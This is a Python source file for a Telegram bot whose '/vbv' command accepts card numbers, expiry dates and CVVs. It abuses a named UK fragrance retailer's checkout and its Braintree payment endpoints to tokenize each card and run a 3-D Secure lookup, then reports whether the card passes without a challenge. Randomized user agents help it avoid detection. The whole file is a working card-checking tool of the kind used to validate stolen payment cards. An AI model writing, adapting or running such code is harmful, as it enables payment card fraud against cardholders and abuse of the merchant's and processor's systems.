import re
import json
import random
import base64
import os
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ---------- CONFIG ----------
PRODUCT_ID = "5200"
FORM_KEY = "lpWVIt1uSHNywyBn"
UENC = "aHR0cHM6Ly93d3cuZnJhZ3JhbmNlY2xpY2suY28udWsvdmljdG9yaWEtcy1zZWNyZXQtbG92ZS1zcGVsbC0yNTBtbC1ib2R5LW1pc3QuaHRtbA%2C%2C"
REFERER = "https://www.fragranceclick.co.uk/victoria-s-secret-love-spell-250ml-body-mist.html"
AMOUNT = 35.90

# ---------- Helper functions (no proxies) ----------
def random_ua() -> str:
    systems = [
        "Windows NT 10.0; Win64; x64",
        "Windows NT 10.0; WOW64",
        f"Macintosh; Intel Mac OS X 10_{random.randint(13,16)}_{random.randint(0,9)}",
        "X11; Linux x86_64",
        f"Linux; Android {random.randint(10,14)}",
        f"iPhone; CPU iPhone OS {random.randint(14,17)}_{random.randint(0,9)} like Mac OS X"
    ]
    chrome = f"{random.randint(110,124)}.0.{random.randint(0,5000)}.{random.randint(0,200)}"
    return f"Mozilla/5.0 ({random.choice(systems)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36"

def extract_client_token(html: str) -> str | None:
    m = re.search(r"authorization:\s*'([^']+)'", html)
    if m:
        return m.group(1)
    m = re.search(r'"clientToken":"([^"]+)"', html)
    return m.group(1) if m else None

def get_auth_fingerprint(client_token: str) -> str | None:
    try:
        decoded = base64.b64decode(client_token).decode('utf-8')
        return json.loads(decoded).get("authorizationFingerprint")
    except:
        try:
            return json.loads(client_token).get("authorizationFingerprint")
        except:
            return None

def evaluate_3ds_status(lookup_data: dict) -> tuple[str, str]:
    three_ds = lookup_data.get("paymentMethod", {}).get("threeDSecureInfo", {})
    status = three_ds.get("status", "").lower()
    if not status:
        status = lookup_data.get("status", "").lower()
    error = lookup_data.get("error", {}).get("message", "") or lookup_data.get("message", "")

    success_keywords = [
        "authenticate attempt successful", "authentication unavailable",
        "authenticate successful", "lookup not enrolled", "lookup_not_enrolled",
        "authenticate_successful", "authentication_unavailable",
        "authenticate_attempt_successful"
    ]
    failure_keywords = [
        "challenge required", "authenticate frictionless failed", "authenticate rejected",
        "authenticate_rejected", "challenge_required",
        "credit card type is not accepted", "unsupported card type",
        "lookup_error", "authenticate_frictionless_failed", "failed", "rejected"
    ]

    if any(kw in status for kw in success_keywords):
        return ("SUCCESS", status.replace("_", " "))
    if any(kw in status for kw in failure_keywords) or error:
        return ("FAILURE", error if error else status.replace("_", " "))
    return ("UNKNOWN", status if status else "No status")

def check_card(cc: str, mes: str, ano: str, cvv: str) -> dict:
    """
    Runs the full 3DS check without proxies.
    Returns dict with 'status' and 'message'.
    """
    ua = random_ua()
    sess = requests.Session()
    sess.headers.update({"User-Agent": ua, "Pragma": "no-cache", "Accept": "*/*"})

    # 1) Add to cart
    add_url = f"https://www.fragranceclick.co.uk/checkout/cart/add/uenc/{UENC}/product/{PRODUCT_ID}/"
    add_data = {
        "qty": "1", "product": PRODUCT_ID, "selected_configurable_option": "",
        "related_product": "", "item": PRODUCT_ID, "form_key": FORM_KEY, "uenc": UENC
    }
    add_headers = {
        "host": "www.fragranceclick.co.uk", "accept": "*/*",
        "accept-language": "en-US,en;q=0.9", "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
        "origin": "https://www.fragranceclick.co.uk", "referer": REFERER, "user-agent": ua,
        "x-requested-with": "XMLHttpRequest",
        "cookie": "last_visited_store=default; mage-cache-sessid=true; form_key=lpWVIt1uSHNywyBn; sib_cuid=; lantern=; Lda_aKUr6BGRn=duertry.com/r/v2?; Lda_aKUr6BGRr=0; private_content_version=; PHPSESSID="
    }
    try:
        r = sess.post(add_url, data=add_data, headers=add_headers, timeout=15)
        if r.status_code != 200:
            return {"status": "ERROR", "message": f"Add to cart HTTP {r.status_code}"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)}

    # 2) Get checkout page
    try:
        r = sess.get("https://www.fragranceclick.co.uk/checkout/", timeout=15)
        client_token = extract_client_token(r.text)
        if not client_token:
            return {"status": "ERROR", "message": "No clientToken"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)}

    auth_fp = get_auth_fingerprint(client_token)
    if not auth_fp:
        return {"status": "ERROR", "message": "No auth fingerprint"}

    # 3) Tokenize via GraphQL
    graphql_payload = {
        "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": ""},
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
        "variables": {
            "input": {
                "creditCard": {"number": cc, "expirationMonth": mes, "expirationYear": ano, "cvv": cvv},
                "options": {"validate": True}
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    headers_graphql = {
        "user-agent": ua, "accept": "*/*", "authorization": f"Bearer {auth_fp}",
        "braintree-version": "2018-05-10"
    }
    try:
        r = sess.post("https://payments.braintree-api.com/graphql", json=graphql_payload, headers=headers_graphql, timeout=15)
        data = r.json()
        token = data.get("data", {}).get("tokenizeCreditCard", {}).get("token")
        if not token:
            return {"status": "FAILURE", "message": "Tokenization failed"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)}

    # 4) 3DS lookup
    lookup_url = f"https://api.braintreegateway.com/merchants/yky2y7rxcskmwgp5/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
    lookup_payload = {"amount": AMOUNT, "browserLanguage": "en-US", "authorizationFingerprint": auth_fp}
    try:
        r = sess.post(lookup_url, json=lookup_payload, headers={"user-agent": ua, "accept": "*/*"}, timeout=15)
        final_status, msg = evaluate_3ds_status(r.json())
        return {"status": final_status, "message": msg}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)}

# ---------- Telegram bot handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Send a card like this:\n"
        "`/vbv 4111111111111111|12|26|123`\n\n"
        "Format: `CC|MM|YY|CVV` (year can be 2 or 4 digits).",
        parse_mode="Markdown"
    )

async def vbv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: `/vbv CC|MM|YY|CVV`", parse_mode="Markdown")
        return

    card_str = " ".join(context.args)  # in case spaces were used
    parts = card_str.split('|')
    if len(parts) != 4:
        await update.message.reply_text("Invalid format. Use: `CC|MM|YY|CVV`", parse_mode="Markdown")
        return

    cc, mes, ano, cvv = parts
    cc = re.sub(r'\D', '', cc)  # keep only digits
    mes = mes.strip()
    ano = ano.strip()
    cvv = cvv.strip()

    if len(ano) == 2:
        ano = f"20{ano}"
    if not (len(cc) >= 13 and len(mes) == 2 and len(ano) == 4 and len(cvv) >= 3):
        await update.message.reply_text("Invalid card details. Check length.")
        return

    await update.message.reply_text(f"Checking card ending in {cc[-4:]} ... Please wait.")

    result = check_card(cc, mes, ano, cvv)
    reply = f"Card: `{cc[-4:]}`\nStatus: *{result['status']}*\nMessage: {result['message']}"
    await update.message.reply_text(reply, parse_mode="Markdown")

# ---------- Main ----------
def main():
    token = os.environ.get("TELEGRAM_BOT_TOKEN")
    if not token:
        print("FATAL: TELEGRAM_BOT_TOKEN environment variable not set.")
        return

    app = Application.builder().token(token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("vbv", vbv_command))

    print("Bot is running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
